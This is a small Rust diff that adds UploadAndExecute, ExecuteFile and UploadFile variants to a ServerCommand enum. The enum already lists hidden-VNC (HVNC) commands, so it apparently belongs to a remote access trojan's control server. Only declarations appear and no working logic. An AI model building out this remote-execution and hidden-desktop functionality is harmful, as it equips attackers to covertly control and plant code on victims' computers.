@@ -85,4 +85,8 @@ pub enum ServerCommand {
     StopHVNC(SocketAddr),
     OpenExplorer(SocketAddr),
     HVNCFrame(SocketAddr, Vec<u8>),
+  
+    UploadAndExecute(SocketAddr, FileData),
+    ExecuteFile(SocketAddr, String),
+    UploadFile(SocketAddr, String, FileData),
 }
